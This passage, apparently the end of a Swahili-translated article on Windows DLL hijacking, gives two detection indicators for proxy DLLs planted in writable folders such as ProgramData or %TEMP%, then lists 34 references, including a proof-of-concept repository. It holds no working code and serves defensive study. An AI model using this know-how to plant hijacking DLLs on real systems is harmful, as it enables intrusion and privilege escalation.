- Threads zinazoundwa na proxy DLL na kuita `LoadLibrary` mara moja kwa DLL ya pili yenye jina lililosimbuliwa.
- Full-export proxy DLL zilizowekwa kando ya executables za wauzaji ndani ya saraka za staging zinazoweza kuandikwa kama `ProgramData`, `%TEMP%`, au njia za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya kijasusi: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kupandisha marupurupu kwa kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore inapeleka malware mpya inayolenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Maradufu wa kidijitali: Muundo wa kampeni zinazobadilika za kujifanya zinazosambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi yanayokutana: Uchambuzi wa makundi ya vitisho yanayolenga serikali ya Kusini-mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua mtandao wa relay na utendaji wa ndani wa operesheni fiche ya mashambulizi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchunguzi wa kina wa toolkit ya Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Mnyororo wa HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia kampeni za ujasusi za 2026 za APT ya Iran, Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Kipengele cha `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Kipengele cha `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Kipengele cha `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Kipengele cha `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Kipengele cha `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Kipengele cha `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Kasi na msisimko: Operesheni za Nimbus Manticore wakati wa mzozo wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 inalenga serikali na miundombinu muhimu ya Kusini-mashariki mwa Asia](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Kuunda upya na kugundua Windows DLL Search-Order Hijacking kwa kutumia Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Kujenga native libraries kwa Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports kwa Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Mpangilio wa kutafuta dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Muundo wa PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Kufichua lahaja ya SectopRAT iliyopachikwa kwenye programu halali](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Kuiba LIGHTSHOW (Sehemu ya Kwanza)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operesheni FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
